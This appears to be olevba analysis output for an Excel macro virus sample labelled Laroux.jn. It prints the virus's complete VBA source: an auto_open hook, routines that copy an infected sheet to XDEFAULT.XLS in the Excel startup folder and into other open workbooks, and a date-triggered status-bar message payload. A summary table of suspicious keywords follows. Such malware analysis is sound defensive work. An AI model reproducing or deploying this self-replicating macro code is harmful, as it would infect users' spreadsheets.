olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Laroux.jn-86b9ffbdcada014a1b1c6aabfa666e29740ea077
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ЭтаКнига.cls 
in file: Virus.MSExcel.Laroux.jn-86b9ffbdcada014a1b1c6aabfa666e29740ea077 - OLE stream: '_VBA_PROJECT_CUR/VBA/ЭтаКнига'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Лист1.cls 
in file: Virus.MSExcel.Laroux.jn-86b9ffbdcada014a1b1c6aabfa666e29740ea077 - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Лист2.cls 
in file: Virus.MSExcel.Laroux.jn-86b9ffbdcada014a1b1c6aabfa666e29740ea077 - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Лист3.cls 
in file: Virus.MSExcel.Laroux.jn-86b9ffbdcada014a1b1c6aabfa666e29740ea077 - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO EHNN.bas 
in file: Virus.MSExcel.Laroux.jn-86b9ffbdcada014a1b1c6aabfa666e29740ea077 - OLE stream: '_VBA_PROJECT_CUR/VBA/EHNN'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 





























Dim SP$, MSP$, AWB$, AP$, Src$
Dim teks(4) As String
Dim N As Byte
Dim diff!, msec!, I%
Sub auto_open()
Application.OnSheetActivate = "check_files"
If Now > DateSerial(1998, 8, 7) Then
    Application.OnTime (Now + TimeValue("00:00:30")), "EHNN.plan"
End If
End Sub
Sub plan()
BmHB
End Sub
Sub check_files()
SP = Application.StartupPath
AWB = ActiveWorkbook.Name
AP = ActiveWorkbook.Path
MSP = Dir(SP & "\" & "XDEFAULT.XLS")
If ActiveWorkbook.Modules.Count > 0 And MSP <> "XDEFAULT.XLS" Then
    Application.ScreenUpdating = False
    Sheets(1).Visible = True
    Sheets(1).Select
    Sheets(1).Copy
    With ActiveWorkbook
        .Title = ""
        .Subject = ""
        .Author = ""
        .Keywords = ""
        .Comments = ""
    End With
    NWB$ = ActiveWorkbook.Name
    ChDir SP
    ActiveWindow.Visible = False
    Workbooks(NWB$).SaveAs FileName:=SP & "/" & "XDEFAULT.XLS", FileFormat:=xlNormal, _
    Password:="", WriteResPassword:="", ReadOnlyRecommended:=False, CreateBackup:=False
    ChDir CurDir()
    Workbooks(AWB).Sheets(1).Visible = False
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "xdefault.xls!check_files"
End If

If MSP = "XDEFAULT.XLS" And ActiveWorkbook.Modules.Count = 0 Then
    Application.ScreenUpdating = False
    Src = Workbooks(AWB).Sheets(1).Name
    If Src <> "raiN" Then
        Workbooks("XDEFAULT.XLS").Sheets(1).Copy before:=Workbooks(AWB).Sheets(1)
        Workbooks(AWB).Sheets(1).Visible = False
    End If
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "xdefault.xls!check_files"
End If
End Sub
Sub BmHB()
teks(1) = "Infected Boomv1.03   "
teks(2) = "Me, No longer to stay in your computer!   "
teks(3) = "Beware of the Boomv1.03!   "
teks(4) = "BmH Guess who(m) am I " & Chr(13) & " thanks to " & Application.UserName & "   "
N = 1
oldSB$ = Application.StatusBar
Do
    DoEvents
    diff = Timer - msec
    If diff > 0.1 Then
        msec = Timer
        I = I + 1
        Application.StatusBar = Left(teks(N), I)
        If Left(teks(N), I) Like "[!]" Then Beep
        If Len(Application.StatusBar) = Len(teks(N)) Then
            If Timer - msec > 1 Then Exit Do
            Application.StatusBar = ""
            msec = Timer
            N = N + 1
            I = 0
            If N = 5 Then
                Application.StatusBar = oldSB$
                Exit Sub
            End If
        End If
    End If
Loop
End Sub

-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

